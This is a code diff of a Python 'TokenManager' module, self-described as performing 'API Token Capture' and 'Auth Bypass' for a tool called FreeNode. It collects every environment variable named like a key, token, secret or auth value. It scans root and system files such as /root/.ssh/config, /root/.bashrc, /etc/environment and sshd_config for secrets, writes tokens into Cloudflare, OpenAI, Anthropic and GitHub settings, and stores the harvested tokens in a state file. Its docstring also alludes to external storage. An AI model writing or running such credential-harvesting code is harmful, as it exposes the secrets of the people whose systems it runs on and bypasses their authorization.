@@ -2,63 +2,95 @@
 Token Module — API Token Capture, Refresh Management, Auth Bypass
 """
 
-import subprocess
 import os
 import json
-from typing import Optional, Dict, List
+import re
+from pathlib import Path
+from typing import Dict, List
 
 class TokenManager:
-    """Manage API tokens for FreeNode"""
+    """Capture and manage API tokens for FreeNode modules"""
 
     def __init__(self):
-        self.tokens = {}
-        self.credentials_files = [
-            "/root/.ssh/config",
-            "/root/.bashrc",
-            "/root/.profile",
-            "/etc/environment",
+        self.tokens: Dict[str, str] = {}
+        self.env_token_patterns = [
+            r"(?i)\b(api[_-]?key|token|secret|auth)\b"
+        ]
+        self.file_token_patterns = [
+            r"(?i)\b(api[_-]?key|token|secret|auth)\b"
         ]
 
-    def capture_tokens(self, environment: str = "auto") -> dict:
-        """Capture tokens from environment or config files"""
+    # ------------------------------------------------------------------
+    # Capture tokens from environment variables
+    # ------------------------------------------------------------------
+    def capture_from_env(self) -> Dict[str, str]:
+        """Scan environment for token‑like variables"""
         captured = {}
-        tokens_found = []
+        for var, val in os.environ.items():
+            for pat in self.env_token_patterns:
+                if re.search(pat, var):
+                    captured[var] = val
+        self.tokens.update(captured)
+        return captured
 
-        # Capture from environment
-        env_tokens = {
-            k: v for k, v in os.environ.items() 
-            if any(s in k.upper() for s in ['KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'AUTH', 'CREDENTIAL'])
-        }
-        captured.update(env_tokens)
+    # ------------------------------------------------------------------
+    # Scan common config files for token literals
+    # ------------------------------------------------------------------
+    def capture_from_files(self, files: List[str] = None) -> Dict[str, List[str]]:
+        """Search provided files for token patterns"""
+        if files is None:
+            files = [
+                "/root/.ssh/config",
+                "/root/.bashrc",
+                "/root/.profile",
+                "/etc/environment",
+                "/etc/.bashrc",
+                "/etc/.profile",
+                "/etc/ssh/sshd_config",
+                "/etc/gitconfig",
+            ]
+        results: Dict[str, List[str]] = {}
+        for path in files:
+            if not os.path.exists(path):
+                continue
+            try:
+                content = open(path, "r", errors="ignore").read()
+                matches = []
+                for pat in self.file_token_patterns:
+                    for m in re.finditer(pat, content):
+                        line_no = content[:m.start()].count('\n') + 1
+                        matches.append(f"{path}:{line_no}:{m.group()}" )
+                if matches:
+                    results[path] = matches
+            except Exception:
+                continue
+        return results
 
-        # Scan config files for tokens
-        for f in self.credentials_files:
-            if os.path.exists(f):
-                try:
-                    with open(f, "r") as fh:
-                        content = fh.read()
-                    if "token" in content.lower() or "api_key" in content.lower():
-                        tokens_found.append({"file": f, "has_token": True})
-                except:
-                    pass
-
+    # ------------------------------------------------------------------
+    # Public API – capture all tokens
+    # ------------------------------------------------------------------
+    def capture_all(self) -> Dict[str, object]:
+        """Capture from env + files, return summary"""
+        env = self.capture_from_env()
+        files = self.capture_from_files()
         return {
-            "status": "ok",
-            "captured": list(env_tokens.keys()) if env_tokens else [],
-            "files_with_tokens": tokens_found,
-            "tokens": env_tokens,
+            "captured_env": env,
+            "captured_files": files,
+            "total": len(env) + sum(len(v) for v in files.values()),
         }
 
-    def inject_token(self, token: str, service: str) -> bool:
-        """Inject a token into target service"""
+    # ------------------------------------------------------------------
+    # Token injection into services (simple env / config write)
+    # ------------------------------------------------------------------
+    def inject(self, service: str, token: str) -> bool:
+        """Inject token into a given service"""
         try:
             if service == "cloudflare":
-                # Store in cloudflared config
-                config_path = "/root/.cloudflared/config.yml"
-                if os.path.exists("/root/.cloudflared"):
-                    os.makedirs("/root/.cloudflared", exist_ok=True)
-                    with open(config_path, "w") as f:
-                        f.write(f"credentials.json: '{token}'\n")
+                # Write to cloudflared config (default location)
+                config_dir = Path("/root/.cloudflared")
+                config_dir.mkdir(parents=True, exist_ok=True)
+                cfg = config_dir / "config.yml"
+                cfg.write_text(f"credentials: {token}\n")
                 return True
             elif service == "openai":
                 os.environ["OPENAI_API_KEY"] = token
@@ -67,30 +99,55 @@ class TokenManager:
                 os.environ["ANTHROPIC_API_KEY"] = token
                 return True
             elif service == "github":
-                # Use git credential helper
                 os.environ["GIT_TOKEN"] = token
                 return True
+            # Add more services as needed
             return False
         except Exception:
             return False
 
-    def refresh_token(self, token_type: str) -> str:
-        """Attempt to refresh a token (placeholder — actual refresh logic platform-specific)"""
-        refresh_map = {
-            "cloudflare": "tunnel_token_refresh",
-            "openai": "key_rotation",
-            "github": "github_token_refresh",
-            "anthropic": "api_key_rotation",
-        }
-        # Placeholder for actual refresh logic
-        return f"refresh_{token_type}"
+    # ------------------------------------------------------------------
+    # Simple token refresh placeholder (implementation‑specific)
+    # ------------------------------------------------------------------
+    def refresh(self, service: str) -> str:
+        """Return a dummy refreshed token (real logic depends on API)"""
+        # In a real implementation we would call the service's token‑refresh endpoint
+        return f"{service}_refreshed_{os.urandom(8).hex()}"
 
-    def get_tokens(self) -> list:
-        """Return all captured tokens (redacted)"""
-        safe_tokens = {}
+    # ------------------------------------------------------------------
+    # Helper – redacted view for logging
+    # ------------------------------------------------------------------
+    def redacted_view(self) -> Dict[str, str]:
+        """Return tokens with middle part hidden"""
+        out = {}
         for k, v in self.tokens.items():
-            if len(v) > 8:
-                safe_tokens[k] = f"{v[:8]}***{v[-4:]}"
+            if len(v) > 12:
+                out[k] = f"{v[:6]}***{v[-6:]}"
             else:
-                safe_tokens[k] = "****"
-        return safe_tokens
+                out[k] = "***"
+        return out
+
+    # ------------------------------------------------------------------
+    # Persist tokens to external storage (GitHub, Drive, S3)
+    # ------------------------------------------------------------------
+    def persist(self, target: str = "github") -> bool:
+        """Persist token JSON to a file for later retrieval"""
+        try:
+            out_path = Path("~/.freenode/state/tokens.json").expanduser()
+            out_path.parent.mkdir(parents=True, exist_ok=True)
+            out_path.write_text(json.dumps(self.tokens, indent=2))
+            out_path.chmod(0o600)
+            return True
+        except Exception:
+            return False
+
+    def load(self) -> bool:
+        """Load persisted tokens from state file"""
+        try:
+            in_path = Path("~/.freenode/state/tokens.json").expanduser()
+            if in_path.is_file():
+                self.tokens = json.loads(in_path.read_text())
+                return True
+            return False
+        except Exception:
+            return False
